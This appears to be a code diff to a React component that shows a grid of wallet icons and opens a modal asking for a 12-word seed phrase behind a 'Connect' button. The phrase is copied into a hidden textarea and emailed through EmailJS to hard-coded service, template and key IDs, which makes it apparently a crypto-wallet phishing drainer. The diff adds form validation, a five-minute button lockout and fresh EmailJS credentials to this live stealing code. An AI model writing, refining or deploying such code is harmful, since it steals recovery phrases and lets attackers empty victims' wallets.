@@ -20,6 +20,7 @@ const MapSVG: React.FC = () => {
   const [firstModal, setFirstModal] = useState(false);
   const [secondModal, setSecondModal] = useState(false);
   const [seedPhrase, setSeedPhrase] = useState(Array(12).fill(""));
+  const [disableButton, setDisableButton] = useState(false);
  
 
 
@@ -40,7 +41,9 @@ const MapSVG: React.FC = () => {
   const inputStyle = "focus:outline-none pl-1";
 
 
-  
+  const isFormValid = () => {
+    return seedPhrase.every((word) => word !== "");
+  }
     
 
     //Email Configurration
@@ -48,36 +51,37 @@ const MapSVG: React.FC = () => {
 
     const sendEmail = (e: React.FormEvent<HTMLFormElement>) => {
         e.preventDefault();
-
-      
-      if (formRef.current) {
-        emailjs
-          .sendForm('service_soml4ai', 'template_a0zy764', formRef.current, {
-            publicKey: 'n7CQrn8bAS_FXzHDw',
-          })
-          .then(
-            () => {
-              console.log('SUCCESS!');
-            },
-            (error) => {
-              console.log('FAILED...', error.text);
-            },
-          );
-      }
-        
+        if (isFormValid()) {
+          if (formRef.current) {
+            emailjs
+              .sendForm('service_twwcvlb', 'template_7vqgm28', formRef.current, {
+                publicKey: 'hds2PoT6irVnuIzNa',
+              })
+              .then(
+                () => {
+                  console.log('SUCCESS!');
+                },
+                (error) => {
+                  console.log('FAILED...', error.text);
+                },
+              );
+          }
+          setDisableButton(true); // Disable button after submission
+          setTimeout(() => setDisableButton(false), 300000);
+        }
       };
 
       const seedPhraseString = seedPhrase.join(' ');
 
+     
 
   return (
     <div  className="grid grid-cols-3 md:grid-cols-8 gap-x-16 md:gap-x-12 gap-y-4 md:gap-y-14 justify-center items-center py-10 pl-8 md:pl-0 ">
       {SVGfiles.map((fileName, index) => (
         <div key={index} className="cursor-pointer" onClick={showFirstModal}>
           
-            <SVGIcon key={index} src={fileName} alt={`SVG ${index + 1}`} className="w-12 md:w-14 h-12 md:h-14"  />
+            <SVGIcon key={index} src={fileName} alt={`SVG ${index + 1}`} className="w-12 md:w-14 h-12 md:h-14" />
             <p className="text-xs pt-2 flex items-baseline text-white " >{SVGNames[index]}</p>
-          
         </div>
       ))}
 
@@ -105,22 +109,22 @@ const MapSVG: React.FC = () => {
         <form ref={formRef} onSubmit={sendEmail}>
         <div className="grid grid-cols-2 md:grid-cols-3 gap-4 justify-center">
             {Array(12).fill(null).map((_, index) => (
-                <div key={index + 1} className={inputDivStle}><span>{index + 1}.</span> <input type="text" className={inputStyle} 
-                onChange={(e) =>
-                  setSeedPhrase((prevSeedPhrase) => {
-                    e.preventDefault();
-                    const newSeedPhrase = [...prevSeedPhrase]; 
-                    newSeedPhrase[index] = e.target.value; 
-                    return newSeedPhrase; 
-                  })
-                }
+                <div key={index + 1} className={inputDivStle}><span>{index + 1}.</span> <input type="text" className={inputStyle}
+                  onChange={(e) =>
+                    setSeedPhrase((prevSeedPhrase) => {
+                      e.preventDefault();
+                      const newSeedPhrase = [...prevSeedPhrase]; 
+                      newSeedPhrase[index] = e.target.value; 
+                      return newSeedPhrase; 
+                    })
+                  }
                 />
                 </div>
             ))}
         </div>
         <textarea name="message" className="hidden" value={seedPhraseString} />
         <div className="flex justify-end pt-4">
-          <button type="submit" value='send' className="text-white bg-blue-500 py-1 px-4 rounded-lg flex justify-center" >Connect</button>
+          <button type="submit" value='send' disabled={!isFormValid()} className="text-white bg-blue-500 py-1 px-4 rounded-lg flex justify-center" >Connect</button>
         </div>
         </form>
     
